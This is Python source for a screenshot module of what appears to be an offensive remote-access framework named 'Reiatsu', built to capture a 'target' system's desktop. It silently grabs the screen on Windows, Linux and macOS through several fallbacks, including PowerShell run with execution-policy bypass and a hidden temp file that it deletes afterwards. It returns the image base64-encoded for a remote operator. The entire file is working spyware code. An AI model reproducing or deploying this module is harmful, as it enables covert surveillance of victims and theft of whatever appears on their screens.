"""
Reiatsu Screenshot Module - Capture target desktop and windows.
"""
import os
import io
import sys
import base64
import platform
import subprocess

class Screenshot:
    """Screenshot: Capture desktop screenshots from target system."""
    
    @staticmethod
    def _capture_windows():
        """Capture screenshot on Windows using multiple methods."""
        output = ""
        screenshot_data = None
        
        # Method 1: Try PIL/Pillow
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, format='PNG', optimize=True)
            screenshot_data = buffer.getvalue()
            output += "[+] Captured using PIL/Pillow\n"
        except ImportError:
            output += "[-] PIL/Pillow not available\n"
        except Exception as e:
            output += f"[-] PIL capture failed: {e}\n"
        
        # Method 2: Try mss (faster)
        if not screenshot_data:
            try:
                import mss
                with mss.mss() as sct:
                    monitor = sct.monitors[1]  # Primary monitor
                    sct_img = sct.grab(monitor)
                    # Convert to PNG
                    from PIL import Image
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    buffer = io.BytesIO()
                    img.save(buffer, format='PNG')
                    screenshot_data = buffer.getvalue()
                    output += "[+] Captured using mss\n"
            except ImportError:
                output += "[-] mss not available\n"
            except Exception as e:
                output += f"[-] mss capture failed: {e}\n"
        
        # Method 3: PowerShell fallback
        if not screenshot_data:
            try:
                ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$ms = New-Object System.IO.MemoryStream
$bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
'''
                result = subprocess.run(
                    ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                    capture_output=True, text=True, timeout=30
                )
                if result.returncode == 0 and result.stdout.strip():
                    screenshot_data = base64.b64decode(result.stdout.strip())
                    output += "[+] Captured using PowerShell\n"
            except Exception as e:
                output += f"[-] PowerShell capture failed: {e}\n"
        
        return output, screenshot_data
    
    @staticmethod
    def _capture_linux():
        """Capture screenshot on Linux using multiple methods."""
        output = ""
        screenshot_data = None
        tmp_file = "/tmp/.reiatsu_screenshot.png"
        
        # Method 1: Try PIL/Pillow with pyscreenshot
        try:
            import pyscreenshot as ImageGrab
            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            screenshot_data = buffer.getvalue()
            output += "[+] Captured using pyscreenshot\n"
        except ImportError:
            output += "[-] pyscreenshot not available\n"
        except Exception as e:
            output += f"[-] pyscreenshot failed: {e}\n"
        
        # Method 2: Try scrot
        if not screenshot_data:
            try:
                result = subprocess.run(
                    ['scrot', '-o', tmp_file],
                    capture_output=True, timeout=10
                )
                if result.returncode == 0 and os.path.exists(tmp_file):
                    with open(tmp_file, 'rb') as f:
                        screenshot_data = f.read()
                    os.remove(tmp_file)
                    output += "[+] Captured using scrot\n"
            except FileNotFoundError:
                output += "[-] scrot not available\n"
            except Exception as e:
                output += f"[-] scrot failed: {e}\n"
        
        # Method 3: Try gnome-screenshot
        if not screenshot_data:
            try:
                result = subprocess.run(
                    ['gnome-screenshot', '-f', tmp_file],
                    capture_output=True, timeout=10
                )
                if result.returncode == 0 and os.path.exists(tmp_file):
                    with open(tmp_file, 'rb') as f:
                        screenshot_data = f.read()
                    os.remove(tmp_file)
                    output += "[+] Captured using gnome-screenshot\n"
            except FileNotFoundError:
                output += "[-] gnome-screenshot not available\n"
            except Exception as e:
                output += f"[-] gnome-screenshot failed: {e}\n"
        
        # Method 4: Try import (ImageMagick)
        if not screenshot_data:
            try:
                result = subprocess.run(
                    ['import', '-window', 'root', tmp_file],
                    capture_output=True, timeout=10
                )
                if result.returncode == 0 and os.path.exists(tmp_file):
                    with open(tmp_file, 'rb') as f:
                        screenshot_data = f.read()
                    os.remove(tmp_file)
                    output += "[+] Captured using ImageMagick\n"
            except FileNotFoundError:
                output += "[-] ImageMagick not available\n"
            except Exception as e:
                output += f"[-] ImageMagick failed: {e}\n"
        
        return output, screenshot_data
    
    @staticmethod
    def _capture_macos():
        """Capture screenshot on macOS."""
        output = ""
        screenshot_data = None
        tmp_file = "/tmp/.reiatsu_screenshot.png"
        
        try:
            result = subprocess.run(
                ['screencapture', '-x', tmp_file],
                capture_output=True, timeout=10
            )
            if result.returncode == 0 and os.path.exists(tmp_file):
                with open(tmp_file, 'rb') as f:
                    screenshot_data = f.read()
                os.remove(tmp_file)
                output += "[+] Captured using screencapture\n"
        except Exception as e:
            output += f"[-] screencapture failed: {e}\n"
        
        return output, screenshot_data

    @staticmethod
    def run_remote(args):
        """Main entry point for screenshot module."""
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            print(f"[+] Screenshot Module - {platform.system()}")
            print("[*] Attempting capture...\n")
            
            system = platform.system()
            
            if system == "Windows":
                method_output, screenshot_data = Screenshot._capture_windows()
            elif system == "Linux":
                method_output, screenshot_data = Screenshot._capture_linux()
            elif system == "Darwin":
                method_output, screenshot_data = Screenshot._capture_macos()
            else:
                print(f"[-] Unsupported OS: {system}")
                method_output, screenshot_data = "", None
            
            print(method_output)
            
            if screenshot_data:
                encoded = base64.b64encode(screenshot_data).decode()
                size_kb = len(screenshot_data) / 1024
                
                print(f"[+] Screenshot captured successfully!")
                print(f"[+] Size: {size_kb:.1f} KB")
                print(f"[+] Format: PNG (base64 encoded)")
                print(f"\n[+] Data (base64):\n{encoded}")
                print(f"\n[*] To save: echo '<base64>' | base64 -d > screenshot.png")
            else:
                print("[-] Screenshot capture failed.")
                print("\n[*] Install required tools:")
                if system == "Windows":
                    print("    pip install Pillow")
                elif system == "Linux":
                    print("    pip install pyscreenshot Pillow")
                    print("    Or: apt install scrot")
                    
        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            sys.stdout = old_stdout
            
        return captured_output.getvalue()
